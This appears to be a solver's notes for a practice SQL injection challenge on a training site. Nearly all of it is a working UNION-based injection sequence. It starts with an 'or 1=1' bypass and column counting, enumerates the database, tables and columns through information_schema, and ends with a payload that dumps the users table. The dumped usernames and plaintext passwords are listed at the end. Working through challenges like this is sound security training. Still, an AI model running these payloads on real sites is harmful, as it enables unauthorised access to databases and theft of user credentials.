http://leettime.net/sqlninja.com/tasks/basic_ch2.php?id=1
Basic sql injection challenge 2

1+or+1=1%23
order by 4
4 columns
 union select 1,2,3,4
 --only second column visible
union select null,version(),null,null
union select null,database(),null,null
-- database name leettime_761wHole
union select null,table_name,null,null from information_schema.tables where table_schema=database()
--testtable1,userlogs,users
union select null,column_name,null,null from information_schema.columns where table_schema=database() and table_name ='users'

-- id,username,password,user_type,sec_code

union%20select%20null,concat(username,0x09,password,0x0a),null,null%20from%20users
--Username is : injector	khan
-- decompiler	hacktract
-- devilhunte	dante
-- Zen	sec-idiots
-- Zenodermus	security-i
-- grayhat	hacker
-- khan	haxor
-- admin	sadmin